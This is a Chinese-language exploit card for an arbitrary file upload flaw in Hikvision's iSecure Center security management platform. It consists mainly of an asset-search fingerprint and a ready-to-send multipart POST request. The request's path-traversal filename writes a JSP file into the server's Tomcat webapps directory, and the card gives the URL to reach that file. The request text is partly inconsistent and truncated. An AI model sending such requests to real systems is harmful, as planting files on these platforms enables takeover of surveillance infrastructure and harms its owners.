# 海康威视iSecureCenter综合安防管理平台center任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /center/api/files;.js HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM7…`

**请求体 / payload**
```
漏洞地址：`/center/api/files;.js`
Host: 127.0.0.1
Content-Length: 257
Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c
--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.jsp"
Content-Type: application/octet-stream
332299402
--ea26cdac4990498b32d7a95ce5a5135c--

上传后的文件位置`/clusterMgr/1.jsp;.js`
https://xx.xx.xx.xx/clusterMgr/153107606.jsp;.js
------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../..…（脚本共 833 字，完整版见原文）
```

**其他**
- 海康威视iSecure Center综合安防管理平台center任意文件上传漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
  * POC1
  * POC2
***
- 版本: HIKVISION iSecure Center综合安防管理平台\